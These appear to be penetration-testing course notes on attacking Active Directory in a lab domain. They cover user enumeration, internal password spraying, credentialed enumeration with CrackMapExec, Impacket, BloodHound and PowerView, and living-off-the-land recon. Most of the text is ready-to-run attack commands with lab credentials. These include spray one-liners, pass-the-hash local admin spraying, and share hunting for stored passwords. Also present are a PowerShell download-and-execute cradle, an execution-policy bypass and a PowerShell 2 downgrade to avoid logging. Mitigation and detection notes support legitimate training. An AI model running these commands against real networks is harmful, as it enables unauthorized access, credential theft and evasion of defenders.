 * Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
 * Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo, or gathered by using a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users
 * Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist

No matter the method we choose, it is also vital for us to consider the domain password policy. If we have an SMB NULL session, LDAP anonymous bind, or a set of valid credentials, we can enumerate the password policy. Having this policy in hand is very useful because the minimum password length and whether or not password complexity is enabled can help us formulate the list of passwords we will try in our spray attempts. Knowing the account lockout threshold and bad password timer will tell us how many spray attempts we can do at a time without locking out any accounts and how many minutes we should wait between spray attempts.

Again, if we do not know the password policy, we can always ask our client, and, if they won't provide it, we can either try one very targeted password spraying attempt as a "hail mary" if all other options for a foothold have been exhausted. We could also try one spray every few hours in an attempt to not lock out any accounts. Regardless of the method we choose, and if we have the password policy or not, we must always keep a log of our activities, including, but not limited to:
 * The accounts targeted
 * Domain Controller used in the attack
 * Time of the spray
 * Date of the spray
 * Password(s) attempted
This will help us ensure that we do not duplicate efforts. If an account lockout occurs or our client notices suspicious logon attempts, we can supply them with our notes to crosscheck against their logging systems and ensure nothing nefarious was going on in the network.

## SMB NULL Session to Pull User List

If you are on an internal machine but don’t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. Either of these will allow you to obtain an accurate list of all users within Active Directory and the password policy. If you already have credentials for a domain user or SYSTEM access on a Windows host, then you can easily query Active Directory for this information.

It’s possible to do this using the SYSTEM account because it can impersonate the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). If you don’t have a valid domain account, and SMB NULL sessions and LDAP anonymous binds are not possible, you can create a user list using external resources such as email harvesting and LinkedIn. This user list will not be as complete, but it may be enough to provide you with access to Active Directory.

Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include enum4linux, rpcclient, and CrackMapExec, among others. Regardless of the tool, we'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. We can do this with enum4linux with the -U flag.

### Using enum4linux

```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

administrator
guest
krbtgt
lab_adm
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch
ccruz
njohnson
mholliday

<SNIP>
```
We can use the enumdomusers command after connecting anonymously using rpcclient.

### Using rpcclient
```
rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers 
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]

<SNIP>
```
Finally, we can use CrackMapExec with the --users flag. This is a useful tool that will also show the badpwdcount (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. It also shows the baddpwdtime, which is the date and time of the last bad password attempt, so we can see how close an account is to having its badpwdcount reset. In an environment with multiple Domain Controllers, this value is maintained separately on each one. To get an accurate total of the account's bad password attempts, we would have to either query each Domain Controller and use the sum of the values or query the Domain Controller with the PDC Emulator FSMO role.

### Using CrackMapExec --users Flag
```
crackmapexec smb 172.16.5.5 --users

## Gathering Users with LDAP Anonymous

We can use various tools to gather users when we find an LDAP anonymous bind. Some examples include [windapsearch](https://github.com/ropnop/windapsearch) and ldapsearch. If we choose to use [ldapsearch](https://linux.die.net/man/1/ldapsearch) we will need to specify a valid LDAP search filter. We can learn more about these search filters in the [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap) module.


### Using ldapsearch
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

ACADEMY-EA-WEB01$
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch

<SNIP>

```
Tools such as windapsearch make this easier (though we should still understand how to create our own LDAP search filters). Here we can specify anonymous access by providing a blank username with the -u flag and the -U flag to tell the tool to retrieve just users.

### Using windapsearch
```
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

## Enumerating Users with Kerbrute

As mentioned in the Initial Enumeration of The Domain section, if we have no access at all from our position in the internal network, we can use Kerbrute to enumerate valid AD accounts and for password spraying.

This tool uses [Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication), which is a much faster and potentially stealthier way to perform password spraying. This method does not generate Windows event ID 4625: An account failed to log on, or a logon failure which is often monitored for. The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error PRINCIPAL UNKNOWN, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid. This method of username enumeration does not cause logon failures and will not lock out accounts. However, once we have a list of valid users and switch gears to use this tool for password spraying, failed Kerberos Pre-Authentication attempts will count towards an account's failed login accounts and can lead to account lockout, so we still must be careful regardless of the method chosen.

Let's try out this method using the [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) wordlist of 48,705 possible common usernames in the format flast. The [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo is an excellent resource for this type of attack and contains a variety of different username lists that we can use to enumerate valid usernames using Kerbrute.

### Kerbrute User Enumeration
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

We've checked over 48,000 usernames in just over 12 seconds and discovered 50+ valid ones. Using Kerbrute for username enumeration will generate event [ID 4768: A Kerberos authentication ticket (TGT)](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768) was requested. This will only be triggered if [Kerberos event logging](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack. If we are successful with this method during a penetration test, this can be an excellent recommendation to add to our report.

If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as linkedin2username to mash up possible usernames from a company's LinkedIn page.

## Credentialed Enumeration to Build our User List

With valid credentials, we can use any of the tools stated previously to build a user list. A quick and easy way is using CrackMapExec.

### Using CrackMapExec with Valid Credentials

```
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
# Internal Password Spraying - from Linux

## Internal Password Spraying from a Linux Host

Once we’ve created a wordlist using one of the methods shown in the previous section, it’s time to execute the attack. Rpcclient is an excellent option for performing this attack from Linux. An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. We can filter out invalid login attempts by grepping for Authority in the response. The following Bash one-liner (adapted from [here](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)) can be used to perform the attack.

### Using a Bash one-liner for the Attack
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
We can also use Kerbrute for the same attack as discussed previously.

### Using Kerbrute for the Attack
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

### Using CrackMapExec & Filtering Logon Failures
```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

### Validating the Credentials with CrackMapExec
```
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

### Local Admin Spraying with CrackMapExec
```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth. It is always worth looking for this issue during penetration tests, even if it is not part of our path to compromise the domain, as it is a common issue and should be highlighted for our clients. One way to remediate this issue is using the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.

---

# Internal Password Spraying - from Windows

From a foothold on a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out. Like how we ran the spraying attack from our Linux host, we can also supply a user list to the tool if we are on a Windows host but not authenticated to the domain. We may run into a situation where the client wants us to perform testing from a managed Windows device in their network that we can load tools onto. We may be physically on-site in their offices and wish to test from a Windows VM, or we may gain an initial foothold through some other attack, authenticate to a host in the domain and perform password spraying in an attempt to obtain credentials for an account that has more rights in the domain.

There are several options available to us with the tool. Since the host is domain-joined, we will skip the -UserList flag and let the tool generate a list for us. We'll supply the Password flag and one single password and then use the -OutFile flag to write our output to a file for later use.

### Using DomainPasswordSpray.ps1
```
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
We could also utilize Kerbrute to perform the same user enumeration and spraying steps shown in the previous section.

## Mitigations
 * **Multi-factor Authentication :** Multi-factor authentication can greatly reduce the risk of password spraying attacks. Many types of multi-factor authentication exist, such as push notifications to a mobile device, a rotating One Time Password (OTP) such as Google Authenticator, RSA key, or text message confirmations. While this may prevent an attacker from gaining access to an account, certain multi-factor implementations still disclose if the username/password combination is valid. It may be possible to reuse this credential against other exposed services or applications. It is important to implement multi-factor solutions with all external portals.
 * **Restricting Access :** It is often possible to log into applications with any domain user account, even if the user does not need to access it as part of their role. In line with the principle of least privilege, access to the application should be restricted to those who require it.
 * **Reducing Impact of Successful Exploitation :** A quick win is to ensure that privileged users have a separate account for any administrative activities. Application-specific permission levels should also be implemented if possible. Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise.
 * **Password Hygiene :** Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack. Also, using a password filter to restrict common dictionary words, names of months and seasons, and variations on the company's name will make it quite difficult for an attacker to choose a valid password for spraying attempts.

## Other Considerations
It is vital to ensure that your domain password lockout policy doesn’t increase the risk of denial of service attacks. If it is very restrictive and requires an administrative intervention to unlock accounts manually, a careless password spray may lock out many accounts within a short period.

## Detection
Some indicators of external password spraying attacks include many account lockouts in a short period, server or application logs showing many login attempts with valid or non-existent users, or many requests in a short period to a specific application or URL.

In the Domain Controller’s security log, many instances of event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771), which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.

With these mitigations finely tuned and with logging enabled, an organization will be well-positioned to detect and defend against internal and external password spraying attacks.

# Credentialed Enumeration - from Linux
We have various options available, but the most important thing to remember is that most of these tools will not work without valid domain user credentials at any permission level. So at a minimum, we will have to have acquired a user's cleartext password, NTLM password hash, or SYSTEM access on a domain-joined host.

## CrackMapExec


[CrackMapExec (CME, now NetExec)](https://github.com/byt3bl33d3r/CrackMapExec) is a powerful toolset to help with assessing AD environments. It utilizes packages from the Impacket and PowerSploit toolkits to perform its functions. For detailed explanations on using the tool and accompanying modules, see the [wiki](https://www.netexec.wiki/). Don't be afraid to use the *-h* flag to review the available options and syntax.

### CME Help Menu
```
crackmapexec -h
```

### CME Options (SMB)
```
 crackmapexec smb -h
```
CME offers a help menu for each protocol (i.e., crackmapexec winrm -h, etc.). Be sure to review the entire help menu and all possible options. For now, the flags we are interested in are:
 * -U username 
 * -p Password
 * target (IP Address or FQDN) host to enumerate (in our case, the Domain Controller)
 * --users Specifies to enumerate Domain Users
 * --groups Specifies to enumerate domain groups
 * --loggedon-users Attempts to enumerate what users are logged on to a target, if any

   We'll start by using the SMB protocol to enumerate users and groups. We will target the Domain Controller (whose address we uncovered earlier) because it holds all data in the domain database that we are interested in. Make sure you preface all commands with sudo.

### CME - Domain User Enumeration

We start by pointing CME at the Domain Controller and using the credentials for the forend user to retrieve a list of all domain users. Notice when it provides us the user information, it includes data points such as the badPwdCount attribute. This is helpful when performing actions like targeted password spraying. We could build a target user list filtering out any users with their badPwdCount attribute above 0 to be extra careful not to lock any accounts out.

```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

### CME - Domain Group Enumeration
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

### CME - Logged On Users
```
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

### CME Share Searching
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

### Spider_plus
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share department_name
#sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
In the above command, we ran the spider against the Department Shares. When completed, CME writes the results to a JSON file located at /tmp/cme_spider_plus/<ip of host>. Below we can see a portion of the JSON output. We could dig around for interesting files such as web.config files or scripts that may contain passwords. If we wanted to dig further, we could pull those files to see what all resides within, perhaps finding some hardcoded credentials or other sensitive information.

```
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
```

## SMBMap
SMBMap is great for enumerating SMB shares from a Linux attack host. It can be used to gather a listing of shares, permissions, and share contents if accessible. Once access is obtained, it can be used to download and upload files and execute remote commands.

### SMBMap To Check Access 
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

### Recursive List Of All Directories
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

## rpcclient
[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD. 
```
rpcclient -U "" -N 172.16.5.5
```
### rpcclient Enumeration

While looking at users in rpcclient, you may notice a field called rid: beside each user. A [Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects. However, there are accounts that you will notice that have the same RID regardless of what host you are on. Accounts like the built-in Administrator for a domain will have a RID [administrator] rid:[0x1f4], which, when converted to a decimal value, equals 500. The built-in Administrator account will always have the RID value Hex 0x1f4, or 500. This will always be the case. Since this value is unique to an object, we can use it to enumerate further information about it from the domain. Let's give it a try again with rpcclient. We will dig a bit targeting the htb-student user.

### RPCClient User Enumeration By RID
```
rpcclient $> queryuser 0x457
```

### Enumdomusers
```
rpcclient $> enumdomusers
```

## Impacket Toolkit

mpacket is a versatile toolkit that provides us with many different ways to enumerate, interact, and exploit Windows protocols and find the information we need using Python. The tool is actively maintained and has many contributors, especially when new attack techniques arise. We could perform many other actions with Impacket, but we will only highlight a few in this section; [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) and [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py). 

### Psexec.py

Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.

To connect to a host with psexec.py, we need credentials for a user with local administrator privileges. Once we execute the psexec module, it drops us into the system32 directory on the target host. 

### wmiexec.py
Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.
```
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
Note that this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command. The downside of this is that if a vigilant defender checks event logs and looks at event ID [4688: A new process has been created](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688), they will see a new process created to spawn cmd.exe and issue a command. This isn't always malicious activity since many organizations utilize WMI to administer computers, but it can be a tip-off in an investigation. In the image above, it's also apparent that the process is running under the context of user wley on the host, not as SYSTEM. Impacket is an immensely valuable tool that has plenty of use cases. We will see many other tools in the Impacket toolkit throughout the remainder of this module. As a pentester working with Windows hosts, this tool should always be in our arsenal. Let's move on to the next tool, Windapsearch.


## Windapsearch

[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries. It is present in our attack host's /opt/windapsearch/ directory.

We have several options with Windapsearch to perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The --da (enumerate domain admins group members ) option and the -PU ( find privileged users) options. The -PU option is interesting because it will perform a recursive search for users with nested group membership.

### Windapsearch - Domain Admins
```
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

### Windapsearch - Privileged Users
```
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

## Bloodhound.py

### BloodHound.py Options
```
bloodhound-python -h
```
As we can see the tool accepts various collection methods with the *-c* or *--collectionmethod* flag. We can retrieve specific data such as user sessions, users and groups, object properties, ACLS, or select all to gather as much data as possible. Let's run it this way.

### Executing BloodHound.py
```
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```
The command above executed Bloodhound.py with the user forend. We specified our nameserver as the Domain Controller with the *-ns* flag and the domain, INLANEFREIGHt.LOCAL with the *-d* flag. The *-c all* flag told the tool to run all checks. Once the script finishes, we will see the output files in the current working directory in the format of <date_object.json>.

### Upload the Zip File into the BloodHound GUI

We could then type sudo neo4j start to start the [neo4j service](https://neo4j.com/), firing up the database we'll load the data into and also run Cypher queries against.

Next, we can type *bloodhound* from our Linux attack host when logged in using *freerdp* to start the BloodHound GUI application and upload the data. The credentials are pre-populated on the Linux attack host, but if for some reason a credential prompt is shown, use:

```
user == neo4j / pass == HTB_@cademy_stdnt!.
```
Once all of the above is done, we should have the BloodHound GUI tool loaded with a blank slate. Now we need to upload the data. We can either upload each JSON file one by one or zip them first with a command such as *zip -r ilfreight_bh.zip *.json* and upload the Zip file. We do this by clicking the Upload Data button on the right side of the window (green arrow). When the file browser window pops up to select a file, choose the zip file (or each JSON file) (red arrow) and hit Open.


Now that the data is loaded, we can use the Analysis tab to run queries against the database. These queries can be custom and specific to what you decide using [custom Cypher queries](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/). There are many great cheat sheets to help us here. We will discuss custom Cypher queries more in a later section. As seen below, we can use the built-in Path Finding queries on the Analysis tab on the Left side of the window.


As a quick note, if you haven't checked out the [WADComs project](https://wadcoms.github.io/) yet, you definitely should. It is an interactive cheat sheet for many of the tools we will cover (and more) in this module. It's hugely helpful when you can't remember exact command syntax or are trying out a tool for the first time. Worth bookmarking and even contributing to!


# Credentialed Enumeration - from Windows

At this point, we are interested in other misconfigurations and permission issues that could lead to lateral and vertical movement. We are also interested in getting a bigger picture of how the domain is set up, i.e., do any trusts exist with other domains both inside and outside the current forest? We're also interested in pillaging file shares that our user has access to, as these often contain sensitive data such as credentials that can be used to further our access.

## TTPs

The first tool we will explore is the [ActiveDirectory PowerShell module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps). When landing on a Windows host in the domain, especially one an admin uses, there is a chance you will find valuable tools and scripts on the host.


## ActiveDirectory PowerShell Module

The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line. It consists of 147 different cmdlets at the time of writing. 

Before we can utilize the module, we have to make sure it is imported first. The [Get-Module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-module?view=powershell-7.2) cmdlet, which is part of the [Microsoft.PowerShell.Core](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/?view=powershell-7.2) module, will list all available modules, their version, and potential commands for use. This is a great way to see if anything like Git or custom administrator scripts are installed. If the module is not loaded, run *Import-Module ActiveDirectory* to load it for use.

### Discover Modules
```
PS C:\htb> Get-Module
```

### Load ActiveDirectory Module
```
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module
```
Now that our modules are loaded, let's begin. First up, we'll enumerate some basic information about the domain with the [Get-ADDomain](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addomain?view=windowsserver2022-ps) cmdlet.


## Get Domain Info
```
PS C:\htb> Get-ADDomain
```
This will print out helpful information like the domain SID, domain functional level, any child domains, and more. Next, we'll use the Get-ADUser cmdlet. We will be filtering for accounts with the ServicePrincipalName property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack, which we will cover in-depth after the next section.

### Get-ADUser
```
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
Another interesting check we can run utilizing the ActiveDirectory module, would be to verify domain trust relationships using the Get-ADTrust cmdlet

### Checking For Trust Relationships
```
PS C:\htb> Get-ADTrust -Filter *
```
This cmdlet will print out any trust relationships the domain has. We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with. This will be useful later on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts. 

## Group Enumeration
```
PS C:\htb> Get-ADGroup -Filter * | select name
```

### Detailed Group Info
```
PS C:\htb> Get-ADGroup -Identity "Backup Operators"
```

### Group Membership
```
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
```

## PowerView
[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool written in PowerShell to help us gain situational awareness within an AD environment. Much like BloodHound, it provides a way to identify where users are logged in on a network, enumerate domain information such as users, computers, groups, ACLS, trusts, hunt for file shares and passwords, perform Kerberoasting, and more. It is a highly versatile tool that can provide us with great insight into the security posture of our client's domain. It requires more manual work to determine misconfigurations and relationships within the domain than BloodHound but, when used right, can help us to identify subtle misconfigurations.
```

```
For more on PowerView, check out the [Active Directory PowerView module](https://academy.hackthebox.com/course/preview/active-directory-powerview). 

### Domain User Information
```
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

We saw some basic user information with PowerView. Now let's enumerate some domain group information. We can use the Get-DomainGroupMember function to retrieve group-specific information. Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups. For example, the output below shows that the Secadmins group is part of the Domain Admins group through nested group membership. In this case, we will be able to view all of the members of that group who inherit Domain Admin rights via their group membership.

### Recursive Group Membership
```
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

Above we performed a recursive look at the Domain Admins group to list its members. Now we know who to target for potential elevation of privileges. Like with the AD PowerShell module, we can also enumerate domain trust mappings.

## Trust Enumeration
```
PS C:\htb> Get-DomainTrustMapping
```
We can use the Test-AdminAccess function to test for local admin access on either the current machine or a remote one.

## Testing for Local Admin Access
```
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

## Finding Users With SPN Set
```
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

## SharpView
PowerView is part of the now deprecated PowerSploit offensive PowerShell toolkit. The tool has been receiving updates by BC-Security as part of their Empire 4 framework. Empire 4 is BC-Security's fork of the original Empire project and is actively maintained as of April 2022. We show examples throughout this module using the development version of PowerView because it is an excellent tool for recon in an Active Directory environment, and is still extremely powerful and helpful in modern AD networks even though the original version is not maintained. The BC-SECURITY version of PowerView has some new functions such as Get-NetGmsa, used to hunt for Group Managed Service Accounts, which is out of scope for this module. It is worth playing around with both versions to see the subtle differences between the old and currently maintained versions.

```
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
```

## Shares

Shares allow users on a domain to quickly access information relevant to their daily roles and share content with their organization. 

### Snaffler

[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.

```
PS C:\htb>  Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```
The -s tells it to print results to the console for us, the -d specifies the domain to search within, and the -o tells Snaffler to write results to a logfile. The -v option is the verbosity level. Typically data is best as it only displays results to the screen, so it's easier to begin looking through the tool runs. Snaffler can produce a considerable amount of data, so we should typically output to file and let it run and then come back to it later. It can also be helpful to provide Snaffler raw output to clients as supplemental data during a penetration test as it can help them zero in on high-value shares that should be locked down first.

We may find passwords, SSH keys, configuration files, or other data that can be used to further our access. Snaffler color codes the output for us and provides us with a rundown of the file types found in the shares.

Now that we have a wealth of data about the INLANEFREIGHT.LOCAL domain (and hopefully clear notes and log file output!), we need a way to correlate it and visualize it. Let's dive deeper into BloodHound and see how powerful this tool can be during any AD-focused security assessment. 

## BloodHound

Bloodhound is an exceptional open-source tool that can identify attack paths within an AD environment by analyzing the relationships between objects. Both penetration testers and blue teamers can benefit from learning to use BloodHound to visualize relationships in the domain. When used correctly and coupled with custom Cipher queries, BloodHound may find high-impact, but difficult to discover, flaws that have been present in the domain for years.

First, we must authenticate as a domain user from a Windows attack host positioned within the network (but not joined to the domain) or transfer the tool to a domain-joined host. 

### SharpHound in Action
```
PS C:\htb>  .\SharpHound.exe --help
```
We'll start by running the SharpHound.exe collector from the MS01 attack host.

```
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
```

Next, we can exfiltrate the dataset to our own VM or ingest it into the BloodHound GUI tool on MS01. We can do this on MS01 by typing bloodhound into a CMD or PowerShell console. The credentials should be saved, but enter neo4j: HTB_@cademy_stdnt! if a prompt appears. Next, click on the Upload Data button on the right-hand side, select the newly generated zip file, and click Open. An Upload Progress window will pop up. Once all .json files show 100% complete, click the X at the top of that window.

We can start by typing domain: in the search bar on the top left and choosing INLANEFREIGHT.LOCAL from the results. Take a moment to browse the node info tab. As we can see, this would be a rather large company with over 550 hosts to target and trusts with two other domains.


# Living Off the Land

This section will discuss several techniques for utilizing native Windows tools to perform our enumeration and then practice them from our Windows attack host.

## Env Commands For Host & Network Recon
First, we'll cover a few basic environmental commands that can be used to give us more information about the host we are on.

```
hostname 	Prints the PC's Name
[System.Environment]::OSVersion.Version 	Prints out the OS version and revision level
wmic qfe get Caption,Description,HotFixID,InstalledOn 	Prints the patches and hotfixes applied to the host
ipconfig /all 	Prints out network adapter state and configurations
set 	Displays a list of environment variables for the current session (ran from CMD-prompt)
echo %USERDOMAIN% 	Displays the domain name to which the host belongs (ran from CMD-prompt)
echo %logonserver% 	Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
```

## Systeminfo

The [systeminfo](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo) command, as seen above, will print a summary of the host's information for us in one tidy output. Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender.

```
systeminfo
```

## Harnessing PowerShell

 * _Get-Module_ : Lists available modules loaded for use.
 * _Get-ExecutionPolicy -List_ : Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.
 * _Set-ExecutionPolicy Bypass -Scope Process_ : This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
 * _Get-ChildItem Env: | ft Key,Value_ : Return environment values such as key paths, users, computer information, etc.
 * _Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt_ : With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.
 * powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" : This is a quick and easy way to download a file from the web using PowerShell and call it from memory.

### Quick Checks Using PowerShell
```
PS C:\htb> Get-Module
PS C:\htb> whoami
PS C:\htb> Get-ChildItem Env: | ft key,value
```

Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.


### Downgrade Powershell
```
PS C:\htb> Get-host
PS C:\htb> powershell.exe -version 2
PS C:\htb> get-module
```

We can now see that we are running an older version of PowerShell from the output above. Notice the difference in the version reported. It validates we have successfully downgraded the shell. Let's check and see if we are still writing logs.

